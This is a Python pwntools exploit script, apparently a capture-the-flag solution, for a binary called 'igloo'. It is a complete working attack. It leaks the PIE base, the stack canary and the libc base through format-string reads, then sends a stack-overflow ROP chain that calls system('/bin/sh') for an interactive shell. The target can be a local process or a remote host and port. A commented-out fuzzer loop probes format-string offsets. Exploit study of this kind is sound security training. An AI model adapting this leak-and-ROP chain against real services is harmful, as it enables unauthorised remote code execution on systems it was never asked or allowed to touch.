from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './igloo'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=True)

## FUZZER 
# sh = start()
# for i in range(100):
#     # sh = start()
#     # pause()
#     sh.sendlineafter(b'>', b'1')
#     sh.sendlineafter(b':', '%{}$p'.format(i))
#     sh.recvuntil(b'med --> ')
#     get = sh.recvline().strip().split()
#     print(str(i), b':', get[0])
#     # sh.interactive()

def get_pie(offset):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', '%{}$p'.format(offset))
    sh.recvuntil(b'med --> ')
    get = sh.recvline().strip().split()
    # print(str(offset), b':', get[0])
    return get[0]

def get_canary(offset):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', '%{}$p'.format(offset))
    sh.recvuntil(b'med --> ')
    get = sh.recvline().strip().split()
    # print(str(offset), b':', get[0])
    return get[0]

def get_libc(offset):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', '%{}$p'.format(offset))
    sh.recvuntil(b'med --> ')
    get = sh.recvline().strip().split()
    # print(str(offset), b':', get[0])
    return get[0]

def exploit():
    # pause()
    log.progress('EXPLOIT STARTS')

    leaked_pie = int(get_pie(4),16)
    info(f'LEAKED PIE --> {hex(leaked_pie)}')
    elf.address = leaked_pie - 8918
    success(f'PIE BASE --> {hex(elf.address)}')

    leaked_canary = int(get_canary(17),16)
    info(f'CANARY --> {hex(leaked_canary)}')

    leaked_libc = int(get_libc(5),16)
    info(f'LIBC LEAK --> {hex(leaked_libc)}')
    libc.address = leaked_libc - libc.sym['_IO_2_1_stdin_']
    success(f'LIBC BASE --> {hex(libc.address)}')

    rop = ROP(elf)
    pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
    success(f'pop rsi; ret; --> {hex(pop_rsi_ret)}')
    mov_rdi_rsi = elf.address + 0x0000000000001218
    success(f'mov rdi, rsi; ret; --> {hex(mov_rdi_rsi)}')
    ret = rop.find_gadget(['ret'])[0]
    success(f'ret; --> {hex(ret)}')
    log.progress('GETTING RCE')
    rop.raw([
        asm('nop') * 104,
        leaked_canary,
        b'A' * 0x8, # junk
        # ret,
        rop.find_gadget(['pop rsi', 'ret'])[0],
        next(libc.search(b'/bin/sh\x00')),
        mov_rdi_rsi,
        # ret,
        libc.sym['system']
    ])
    
    print(rop.dump())

    sh.sendlineafter(b'>', b'2')
    sh.sendlineafter(b':', rop.chain())

if __name__ == "__main__":
    sh = start()
    exploit()
    sh.interactive()